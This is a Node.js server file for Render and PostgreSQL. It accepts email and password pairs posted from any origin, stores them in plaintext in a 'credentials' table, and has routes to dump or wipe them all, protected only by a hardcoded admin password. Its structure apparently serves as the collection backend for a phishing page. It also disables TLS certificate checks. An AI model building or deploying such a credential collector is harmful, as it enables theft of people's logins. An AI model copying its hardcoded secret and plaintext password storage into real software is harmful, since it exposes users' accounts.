const http = require('http');
const { Client } = require('pg'); // Import the pg package to interact with PostgreSQL

// Define the database connection string (you will get this from your Render dashboard)
const client = new Client({
    connectionString: process.env.DATABASE_URL, // The DATABASE_URL environment variable is set in Render
    ssl: {
        rejectUnauthorized: false, // Required for secure connection on Render
    }
});

// Connect to the PostgreSQL database
client.connect()
    .then(() => {
        console.log("Connected to PostgreSQL database.");
    })
    .catch((err) => {
        console.error("Error connecting to PostgreSQL database:", err.stack);
    });

// Define an admin password for secured routes
const ADMIN_PASSWORD = "kadri_pass";

const requestListener = (req, res) => {
    console.log(`Request received: Method ${req.method}, URL ${req.url}`);

    // Configure CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }

    // Check the password for secured routes
    const password = req.headers['authorization']; // The password is sent in the headers
    if ((req.method === 'GET' || req.method === 'DELETE') && password !== ADMIN_PASSWORD) {
        res.writeHead(401, { 'Content-Type': 'text/plain' });
        res.end('Password required or incorrect.');
        return;
    }

    // POST route to store data in the database
    if (req.method === 'POST' && req.url === '/store') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });

        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const { email, password } = data;

                if (!email || !password) {
                    res.writeHead(400, { 'Content-Type': 'text/plain' });
                    res.end('Email and password are required.');
                    return;
                }

                // Insert data into PostgreSQL database
                const query = 'INSERT INTO credentials (email, password) VALUES ($1, $2) RETURNING id';
                const values = [email, password];

                const result = await client.query(query, values);

                // Return success response
                console.log('Data successfully inserted, ID:', result.rows[0].id);
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end('Information successfully stored.');
            } catch (err) {
                console.error('Error inserting data into PostgreSQL:', err);
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Error storing the information.');
            }
        });
    }

    // GET route to retrieve data from the database
    else if (req.method === 'GET' && req.url === '/data') {
        const query = 'SELECT * FROM credentials';
        
        client.query(query)
            .then(result => {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(result.rows));
            })
            .catch(err => {
                console.error('Error retrieving data:', err);
                res.writeHead(500, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Error retrieving data.' }));
            });
    }

    // DELETE route to delete all records from the credentials table
    else if (req.method === 'DELETE' && req.url === '/delete_all') {
        const deleteQuery = 'DELETE FROM credentials';

        client.query(deleteQuery)
            .then(() => {
                console.log('All records deleted.');
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end('All records deleted.');
            })
            .catch(err => {
                console.error('Error deleting records:', err);
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Error deleting records.');
            });
    }

    // Route not found
    else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Route not found.');
    }
};

const server = http.createServer(requestListener);

const PORT = process.env.PORT || 3000; // Use Render's environment variable for the port
server.listen(PORT, () => {
    console.log(`Server started on http://localhost:${PORT}`);
});
